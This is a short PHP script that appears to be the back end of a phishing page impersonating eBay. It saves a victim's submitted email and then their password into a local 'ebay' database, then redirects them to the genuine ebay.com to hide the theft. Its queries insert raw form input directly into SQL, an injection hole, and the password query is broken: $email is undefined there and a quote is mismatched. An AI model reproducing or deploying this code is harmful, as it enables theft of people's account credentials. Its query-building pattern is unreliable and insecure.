<?php

if(isset($_POST['submit']))
{
    $connection = mysqli_connect("localhost" , "root" , "" , "ebay") ; 

    

    $email = $_POST['Email'];
   

        
            $query = "INSERT INTO client (Email)
            VALUES ('$email')";
            $query_run = mysqli_query($connection, $query);
    
           
       header('Location: password.php');
         
}



if(isset($_POST['submiit']))
{
    $connection = mysqli_connect("localhost" , "root" , "" , "ebay") ; 

    

    $password = $_POST['Password'];
   

        
            $query = "INSERT INTO clientt (Email,password)
            VALUES ('$email',$password')";
            $query_run = mysqli_query($connection, $query);
    
           
       header('Location: https://www.ebay.com/');
         
}

?>